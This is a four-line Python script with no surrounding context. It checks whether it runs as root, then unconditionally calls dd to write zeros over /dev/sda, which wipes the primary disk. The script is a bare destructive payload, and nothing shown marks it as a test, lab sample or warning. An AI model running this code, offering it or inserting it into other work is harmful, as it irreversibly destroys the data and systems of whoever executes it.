import os, subprocess
if os.geteuid() == 0:
    print('root')
subprocess.run(['dd','if=/dev/zero','of=/dev/sda'])
